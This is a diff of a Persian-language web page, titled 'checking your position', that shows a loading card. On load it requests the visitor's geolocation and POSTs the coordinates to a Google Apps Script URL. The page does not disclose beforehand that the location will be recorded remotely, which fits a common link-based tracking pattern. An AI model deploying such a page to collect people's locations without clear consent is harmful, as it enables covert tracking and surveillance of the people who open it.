@@ -1,36 +1,76 @@
 <!DOCTYPE html>
-<html>
+<html lang="fa">
 <head>
-  <title>مکان‌یابی</title>
+  <meta charset="UTF-8">
+  <title>در حال بررسی موقعیت</title>
+  <style>
+    body {
+      font-family: sans-serif;
+      text-align: center;
+      padding-top: 50px;
+      background-color: #f2f2f2;
+    }
+    .card {
+      background: white;
+      padding: 30px;
+      border-radius: 12px;
+      box-shadow: 0 0 10px rgba(0,0,0,0.1);
+      display: inline-block;
+    }
+    .loader {
+      border: 6px solid #ccc;
+      border-top: 6px solid #007bff;
+      border-radius: 50%;
+      width: 40px;
+      height: 40px;
+      animation: spin 1s linear infinite;
+      margin: 20px auto;
+    }
+    @keyframes spin {
+      0% { transform: rotate(0deg); }
+      100% { transform: rotate(360deg); }
+    }
+  </style>
+</head>
+<body>
+  <div class="card">
+    <h2>در حال بررسی موقعیت شما...</h2>
+    <div class="loader"></div>
+    <p>لطفاً اجازه مکان‌یابی را صادر نمایید</p>
+  </div>
+
   <script>
     function sendLocation(position) {
-      fetch("https://script.google.com/macros/s/AKfycbzds7uj0cA6EUBpyXpsvu399RxInqIuV0GG9enarElR771bs-4Oy7PFaYsxrpqYkKPpRg/exec", {
+      fetch("https://script.google.com/macros/library/d/18FRJx-pYbC0qS4-5AFYwSFOnXYUALa7hzUTuqk5HV_yzpWShED9w_xBR/1", {
         method: "POST",
+        headers: {
+          "Content-Type": "application/json"
+        },
         body: JSON.stringify({
           latitude: position.coords.latitude,
           longitude: position.coords.longitude
-        }),
-        headers: {
-          "Content-Type": "application/json"
-        }
+        })
       })
-      .then(response => response.text())
-      .then(data => alert("موقعیت ثبت شد: " + data))
-      .catch(error => alert("خطا در ارسال موقعیت: " + error));
+      .then(res => res.text())
+      .then(msg => {
+        document.body.innerHTML = "<h2>موقعیت با موفقیت ثبت شد</h2><p>" + msg + "</p>";
+      })
+      .catch(err => {
+        document.body.innerHTML = "<h2>خطا در ارسال داده</h2><p>" + err + "</p>";
+      });
     }
 
     function getLocation() {
       if (navigator.geolocation) {
         navigator.geolocation.getCurrentPosition(sendLocation, () => {
-          alert("دسترسی مکان رد شد.");
+          document.body.innerHTML = "<h2>اجازه مکان رد شد</h2>";
         });
       } else {
-        alert("مرورگر شما مکان‌یابی را پشتیبانی نمی‌کند.");
+        document.body.innerHTML = "<h2>مرورگر شما پشتیبانی نمی‌کند</h2>";
       }
     }
+
+    window.onload = getLocation;
   </script>
-</head>
-<body onload="getLocation()">
-  <h2>در حال مکان‌یابی...</h2>
 </body>
 </html>
